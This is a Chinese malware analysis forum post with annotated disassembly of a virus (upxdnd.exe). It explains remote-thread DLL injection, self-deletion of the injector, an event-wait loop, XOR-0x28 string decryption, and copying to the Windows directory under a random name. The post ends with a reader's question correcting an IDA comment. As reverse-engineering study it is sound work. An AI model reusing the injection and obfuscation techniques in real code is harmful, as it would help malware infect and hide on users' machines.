00401600`addesp, 10h`

00401603`testeax, eax`

00401605`jzshort loc_401623`

00401605

00401607`xorea, eax`

00401609`pusheax; lpThreadId`

0040160A`pusheax; dwCreationFlags`

0040160B`push[ebp+lpAddress]; lpParameter`



# 汇编代码与反汇编分析

## 1. 创建远线程与资源释放

以下代码段展示了如何创建远线程，随后释放内存并返回上层调用。

```asm
0040160E          push    [ebp+lpStartAddress] ; lpStartAddress  
00401611          push    400h                 ; dwStackSize  
00401616          push    eax                  ; lpThreadAttributes  
00401617          push    [ebp+hObject]         ; hProcess  
0040161A          call    ds:CreateRemoteThread ; 创建远线程到目标进程，线程函数和参数已经写入目标进程  
00401620          mov     [ebp+var_1C], eax  

  远线程创建完毕，释放内存，返回上层调用。  

00401623          push    ebx                  ; dwSize  
00401624          push    esi                  ; lpAddress  
00401625          push    [ebp+hProcess]        ; hProcess  
00401628          call    FreeMemory  

00401628  

0040162D          push    ebx                  ; dwSize  
0040162E          push    [ebp+var_C]          ; lpAddress  
00401631          push    [ebp+hProcess]        ; hProcess  
00401634          call    FreeMemory  

00401634  

00401639          add     esp, 18h  

00401639  

0040163C          push    [ebp+hObject]         ; hObject  
0040163F          call    ds:CloseHandle  
00401645          mov     eax, [ebp+var_1C]  
00401648          pop     edi  
00401649          pop     esi  
0040164A          pop     ebx  
0040164B          leave  
0040164C          retn  
```

## 2. 远线程处理函数分析

`h)` 远线程处理函数分析：调用 `LoadLibraryA` 加载病毒 DLL，然后，调用 DLL 映像基址+`0x30` 所指向的地址处的函数。然后判断 `LoaderPathName` 是否为 `NULL`（从前面可以看到如果 `EXE` 为 `%windir%\upxdnd.exe`，则其为 `NULL`），不为 `NULL`，则删除名称为 `LoaderPathName` 的文件，然后函数调用 `OpenEventA` 打开名为`"51343281"`的事件，除非有新的病毒实例启动创建这个事件，否则该函数在此处一直循环等待，当有新病毒实例运行后，线程函数退出循环，调用 `Dll+0x34` 处所指向的函数，然后释放 DLL，退出远线程。

```asm
004013D9 RemoteThreadProc proc near               ;  
004013D9  

004013D9 var_4            = dword ptr -4  
004013D9 arg_0            = dword ptr  8  
004013D9  

004013D9                 push    ebp  
004013DA                 mov     ebp, esp  
004013DC                 push    ecx  
004013DD                 push    esi  
004013DE                 mov     esi, [ebp+arg_0]  
004013E1                 push    edi  
004013E2                 lea     eax, [esi+18h]  ; LibPathName  
004013E5                 push    eax  
004013E6                 call    dword ptr [esi] ; 加载 LibPathName 所指 DLL  
004013E8                 and     byte ptr [ebp+arg_0+3], 0  
004013EC                 mov     edi, eax  
004013EE                 mov     eax, [edi+30h]  
004013F1                 mov     ecx, [edi+34h]  
004013F4                 test    eax, eax  
004013F6                 mov     [ebp+var_4], ecx  
004013F9                 jz      short loc_401447  
004013F9  

004013FB                 push    ebx  
004013FC                 call    eax             ; 调用 Dll 中的函数(未导出)  
004013FE                 lea     ebx, [esi+11Ch] ; ModuleFileName  
004013FE  

00401404  

00401404                 cmp     byte ptr [ebx], 0  
00401407                 jz      short loc_401419 ;  
00401407  

00401409                 cmp     byte ptr [ebp+arg_0+3], 0  
0040140D                 jnz     short loc_401419 ; "51343281"  
0040140D  

0040140F                 push    ebx  
00401410                 call    dword ptr [esi+4] ; DeleteFileA 删除注入器病毒程序  
00401413                 test    eax, eax  
00401415                 setnz   byte ptr [ebp+arg_0+3] ; 删除标记，重复利用输入参数  
00401415  

00401419  

00401419                 lea     eax, [esi+220h] ; "51343281"  
0040141F                 push    eax  
00401420                 push    0  
00401422                 push    1F0003h  
00401427                 call    dword ptr [esi+8] ; OpenEventA  
0040142A                 test    eax, eax  
0040142C                 jnz     short loc_401435 ; 直到有新的病毒实例创建事件，否则该线程处理函数一直处于循环等待状态  
0040142E                 push    64h  
00401430                 call    dword ptr [esi+0Ch] ; Sleep 100ms  
00401433                 jmp     short loc_401404  
00401433  

00401435 ; ---------------------------------------------------------------------------  
00401435                 push    eax  
00401436                 call    dword ptr [esi+10h] ; CloseHandle Event  
00401439                 call    [ebp+var_4]     ; 调用 Dll+0x34 处所指向的函数  
0040143C                 push    edi  
0040143D                 call    dword ptr [esi+14h] ; FreeLibrary Dll  
00401440                 push    edi  
00401441                 call    dword ptr [esi+10h] ; CloseHandle hDllModule  
00401444                 xor     eax, eax  
00401446                 pop     ebx  
00401446  

00401447                 pop     edi  
00401448                 pop     esi  
00401449                 leave  
0040144A  

0040144A locret_40144A:  
0040144A                 retn    4  
0040144A  

0040144A RemoteThreadProc endp  
```

## 3. 病毒程序中的解密程序

病毒中保存的许多敏感的字符中都是经过加密（其实就是与 `0x28` 异或）存储的，病毒在使用的时候，都是先解密然后再使用的。

```asm
00401979 Decrypt proc near                ; CODE XREF: SetAutoRun+2B p  
00401979                                 ; AntiAV+11 p AntiAV+1D p  
00401979                                 ; AntiAV+29 p  
00401979  

00401979 arg_0            = dword ptr  8  
00401979 arg_4            = dword ptr  0Ch  
00401979  

00401979                 push    ebp  
0040197A                 mov     ebp, esp  
0040197C                 nop  
0040197D                 xor     ecx, ecx  
0040197F                 cmp     [ebp+arg_4], ecx  
00401982                 jle     short loc_401992  
00401982  

00401984  

00401984 loc_401984:                          ; CODE XREF: Decrypt+17 j  
00401984                 mov     eax, [ebp+arg_0]  
00401987                 add     eax, ecx  
00401989                 xor     byte ptr [eax], 28h  
0040198C                 inc     ecx  
0040198D                 cmp     ecx, [ebp+arg_4]  
00401990                 jl      short loc_401984  
00401990  

00401992  

00401992 loc_401992:                          ; CODE XREF: Decrypt+9 j  
00401992                 pop     ebp  
00401993                 retn  
00401993  

00401993 Decrypt endp  
```

---
【版权声明】：本文原创于看雪技术论坛，转载请注明作者并保持文章的完整，谢谢！

2008 年 02 月 26 日 17:15:03

## 4. 随机字符串生成与文件操作分析

```asm
00401194                 push    0Ah  
```

`00401196` `push offset s_Upxdnd_exe` ; `"upxdnd.exe"`  
`0040119B` `call ConvToRandString`  
`0040119B`

### 疑问：`ConvToRandString` 具体是怎么做的？

```asm
004011A8                 mov     dword ptr s_Upxdnd_exe+6, 6578652Eh  
```

这里最好注释一下，实际上是将 `s_Upxdnd_exe` 这个字符串后面改成 `".exe"`。

### 后续代码位置

经过这样的修改后，到了以下位置：

```asm
004011DC                 lea     eax, [ebp+Data]  
004011E2                 push    offset s_Upxdnd_exe ; "upxdnd.exe"  
004011E7                 push    eax             ; char *  
004011E8                 call    strcat  
004011E8  
```

运行时这个 `s_Upxdnd_exe` 的内容已经变成了楼主所说的 `"??"??"?.exe"`，所以注释有问题（注释是 `IDA` 自动生成的），这里注释最好改一下。

只有这样才能理解，为什么接下来调用 `CopyFileA` 的结果，会是 `“拷贝到 windows 目录下并随机命名”`。

这是作为别人在阅读这些反汇编结果的时候会出现的不解之处。
